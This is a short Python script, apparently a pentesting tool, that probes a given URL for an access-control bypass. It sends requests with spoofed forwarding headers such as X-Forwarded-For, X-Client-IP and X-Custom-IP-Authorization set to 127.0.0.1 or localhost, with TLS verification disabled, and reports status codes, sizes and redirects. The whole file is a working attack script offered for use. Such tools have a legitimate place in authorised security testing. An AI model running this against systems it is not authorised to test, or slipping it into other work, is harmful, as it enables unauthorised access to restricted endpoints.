#!/usr/bin/env python3
import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BYPASS_IP = "127.0.0.1"

HEADERS_TO_TEST = [
    "Forwarded",
    "Forwarded-For",
    "Forwarded-For-Ip",
    "X-Client-IP",
    "X-Custom-IP-Authorization",
    "X-Forward",
    "X-Forwarded",
    "X-Forwarded-By",
    "X-Forwarded-For",
    "X-Forwarded-For-Original",
    "X-Forwared-Host",
    "X-Host",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
]

LOCAL_HEADERS = [
    "Forwarded",
    "Forwarded-For",
    "X-Forward",
    "X-Forwarded",
    "X-Forwarded-By",
    "X-Forwarded-For",
    "X-Forwarded-For-Original",
    "X-Forwared-Host",
    "X-Host",
    "X-Remote-Addr",
    "X-Forwarded-Server"
]

def print_banner():
    print("\033[1;36m" + "╔" + "═" * 70 + "╗")
    print("║{:^70}║".format("RESULTADOS COLETADOS"))
    print("╚" + "═" * 70 + "╝" + "\033[0m")


def send_request(url, header_name, value):
    try:
        # segue redirecionamentos
        response = requests.get(
            url,
            headers={header_name: value},
            verify=False,
            timeout=5,
            allow_redirects=True
        )

        size = len(response.content)
        status = response.status_code

        # cores
        if status < 300:
            color = "🟩"
        elif status < 400:
            color = "🟦"    # redirect
        else:
            color = "🟥"

        # se houver redirect, capturar o destino final
        redirect_to = ""
        if status >= 300 and status < 400:
            # pega só o Location da primeira resposta
            try:
                first = requests.get(
                    url,
                    headers={header_name: value},
                    verify=False,
                    timeout=5,
                    allow_redirects=False
                )
                loc = first.headers.get("Location")
                if loc:
                    redirect_to = f" -> {loc}"
            except:
                pass

        print(f"{color} {status} | {size} bytes | {header_name}: {value}{redirect_to}")

    except Exception:
        print(f"🟥 ERR | 0 bytes | {header_name}: {value}")


def main():
    if len(sys.argv) != 2:
        print("Uso: python3 bypass.py <url>")
        sys.exit(1)

    url = sys.argv[1]

    if not url.startswith("http"):
        url = "http://" + url

    print_banner()

    for h in HEADERS_TO_TEST:
        send_request(url, h, "127.0.0.1")

    for h in LOCAL_HEADERS:
        send_request(url, h, "localhost")


if __name__ == "__main__":
    main()
